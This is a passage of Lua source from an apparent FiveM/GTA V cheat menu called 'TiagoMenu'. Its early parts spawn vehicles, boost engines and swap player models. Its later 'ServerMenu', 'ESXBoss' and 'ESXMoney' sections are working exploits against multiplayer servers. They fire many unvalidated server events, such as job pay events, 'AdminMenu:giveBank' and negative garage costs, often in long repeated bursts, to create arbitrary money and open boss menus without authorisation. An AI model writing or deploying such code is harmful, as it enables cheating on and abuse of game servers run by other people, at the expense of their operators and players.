                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                    else
                        if b9 and ts == du.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if TiagoMenu.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            ba = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        elseif b9 and currims == du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif b9 and currims ~= du.id then
                            SetVehicleExtraColours(veh, oldpearl, du.id)
                            b9 = true
                        end
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('AICONTROLMENU') then
                if TiagoMenu.Button('~h~Configure AI ~g~Speed') then
                    local cspeed = KeyboardInput('Enter Wanted MaxSpeed', '', 100)
                    if cspeed ~= nil or cspeed ~= '' then
                        aispeed = (cspeed .. '.0')
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
                    end
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif TiagoMenu.Button('~h~AI Drive (Waypoint_Slow)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif TiagoMenu.Button('~h~AI Drive (Waypoint_Fast)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif TiagoMenu.Button('~h~AI Drive (Wander)') then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print('Configured speed is currently ' .. aispeed)
                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
                elseif TiagoMenu.Button('~h~Stop AI') then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
                    end
                end
				
				 TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('LSC') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                TiagoMenu.MenuButton('~h~Exterior ~r~Tuning', 'tunings')
                TiagoMenu.MenuButton('~h~Performance ~r~Tuning', 'performance')
			
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if TiagoMenu.MenuButton('~h~~r~> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if TiagoMenu.MenuButton('~h~~r~# ~s~' .. dF, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened('CarOptions') then
			if TiagoMenu.Button('~h~~y~-Spawn intro vehicle-') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local dG = 0
                            while not HasModelLoaded(vehiclehash) do
                                dG = dG + 100
                                Citizen.Wait(100)
                                if dG > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                elseif TiagoMenu.Button('~h~~g~-Spawn vehicle-') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local dG = 0
                            while not HasModelLoaded(vehiclehash) do
                                dG = dG + 100
                                Citizen.Wait(100)
                                if dG > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end

		TiagoMenu.Display()
				
				elseif TiagoMenu.IsMenuOpened('TorqueBoostMenu') then 
			if TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x2', Torque2, function(enabled)
				Torque2 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x4', Torque4, function(enabled)
				Torque4 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x8', Torque8, function(enabled)
				Torque8 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x16', Torque16, function(enabled)
				Torque16 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x32', Torque32, function(enabled)
				Torque32 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x64', Torque64, function(enabled)
				Torque64 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x128', Torque128, function(enabled)
				Torque128 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x256', Torque256, function(enabled)
				Torque256 = enabled
			end) then
			elseif TiagoMenu.CheckBox('Engine Torque boost ~h~~g~x512', Torque512, function(enabled)
				Torque512 = enabled
			end) then
			end
				
				
				TiagoMenu.Display()
            elseif TiagoMenu.IsMenuOpened("VehBoostMenu") then
                if TiagoMenu.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif TiagoMenu.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif TiagoMenu.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
				
               TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("Models") then
			 
								if TiagoMenu.ComboBox("~h~~b~Male Model", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif TiagoMenu.Button("Selected ~b~> ") then
					Deer.Destroy()
		Wait(100)
				local model1 = GetHashKey(peds2[selectedPedd])
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model1)
    while not HasModelLoaded(model1) do
        Wait(100)
    end

    SetPlayerModel(player1, model1)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
				elseif TiagoMenu.ComboBox("~h~~p~Female Model", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif TiagoMenu.Button("Selected ~p~>") then
		Deer.Destroy()
		Wait(100)
				local model5 = GetHashKey(peds3[selectedPeddd])
				local player5 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model5)
    while not HasModelLoaded(model5) do
        Wait(100)
    end

    SetPlayerModel(player5, model5)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model5)
				elseif TiagoMenu.ComboBox("~h~~o~Animal Model", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
	elseif TiagoMenu.Button("Selected ~o~> ") then
			Deer.Destroy()
		Wait(100)
				local model6 = GetHashKey(peds4[selectedPedddd])
				local player6 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model6)
    while not HasModelLoaded(model6) do
        Wait(100)
    end

    SetPlayerModel(player6, model6)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model6)
		elseif TiagoMenu.Button("Spawn ~r~Deer ~s~And Ride") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif TiagoMenu.Button("~g~Reset Model To FiveM Player") then
						Deer.Destroy()
		Wait(100)
				local model3 = GetHashKey("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(model3)
     while not HasModelLoaded(model3) do
        Wait(100)
    end

    SetPlayerModel(player3, model3)
	SetPedDefaultComponentVariation(GetPlayerPed(-1))
    SetModelAsNoLongerNeeded(model3)
	elseif TiagoMenu.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
				local model13 = GetHashKey("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model13)
    while not HasModelLoaded(model13) do
        Wait(100)
    end

    SetPlayerModel(player1, model13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif TiagoMenu.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
				local model12 = GetHashKey("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model12)
    while not HasModelLoaded(model12) do
        Wait(100)
    end

    SetPlayerModel(player1, model12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model12)
	elseif TiagoMenu.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
				local model11 = GetHashKey("player_one")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model11)
    while not HasModelLoaded(model11) do
        Wait(100)
    end

    SetPlayerModel(player1, model11)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model11)
	elseif TiagoMenu.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
				local model121 = GetHashKey("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model121)
    while not HasModelLoaded(model121) do
        Wait(100)
    end

    SetPlayerModel(player1, model121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model121)
	elseif TiagoMenu.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
				local model122 = GetHashKey("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(model122)
    while not HasModelLoaded(model122) do
        Wait(100)
    end

    SetPlayerModel(player1, model122)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model122)
	elseif TiagoMenu.Button("Change To ~p~Clown") then
			local model = "s_m_y_clown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
			elseif TiagoMenu.Button("Change To ~r~Stripper") then
			local model = "s_f_y_stripper_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif TiagoMenu.Button("Change To ~b~Cop") then
			local model = "s_m_y_cop_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif TiagoMenu.Button("Change To ~o~Chimp") then
			local model = "a_c_chimp"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif TiagoMenu.Button("Change To ~g~Alien") then
			local model = "s_m_m_movalien_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif TiagoMenu.Button("Change To ~p~Pongo") then
			local model = "u_m_y_pogo_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
					elseif TiagoMenu.Button("Change To ~o~Babyd") then
			local model = "u_m_y_babyd"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif TiagoMenu.Button("~h~Randomize ~r~Model") then
				SetPedRandomComponentVariation(PlayerPedId(), true)

	elseif TiagoMenu.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
	end
				
				
				
				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("ServerMenu") then
				if TiagoMenu.MenuButton("~s~Menu ~h~~r~JOBS", "RecrutarPlayers") then
				elseif TiagoMenu.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif TiagoMenu.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif TiagoMenu.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif TiagoMenu.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end
				

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("ESXBoss") then
				if TiagoMenu.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif TiagoMenu.Button("~g~~h~ESX ~y~Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("ESXMoney") then
				if TiagoMenu.Button("~h~~g~MONEY ~s~~h~BEST") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent("dropOff", result)
				TriggerServerEvent('truckerfuel:success',result)
				TriggerServerEvent('delivery:success',result)
				TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				TriggerServerEvent("esx_brinksjob:pay", result)
				TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent("esx_postejob:pay", result)
				TriggerServerEvent('esx_garbage:pay', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif TiagoMenu.Button("~g~~h~MONEY ~s~16") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
